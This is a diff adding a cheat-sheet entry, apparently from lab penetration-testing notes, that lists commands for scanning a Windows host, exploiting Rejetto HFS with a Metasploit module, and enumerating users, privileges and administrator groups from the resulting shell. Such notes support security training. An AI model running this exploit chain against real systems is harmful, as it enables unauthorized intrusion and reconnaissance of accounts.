@@ -1795,10 +1795,30 @@ shell
 hostname
 systeminfo
 wmic qfe get Caption,Description,HotFixID,InstalledOn
-
 ```
-
-
+94) Enumerating Users & Groups
+```
+nmap -sV 10.2.22.30
+searchsploit rejetto
+msfconsole
+use exploit/windows/http/rejetto_hsf_exec
+set RHOSTS 10.2.22.30
+exploit
+getuid
+getprivs
+background
+use post/windows/gather/enum_logged_on_users
+set SESSION 1
+run
+sessions 1
+shell
+whoami
+whoami /priv
+net users
+net user administrator
+net localgroup
+net localgroup administrators
+```
 
 
 
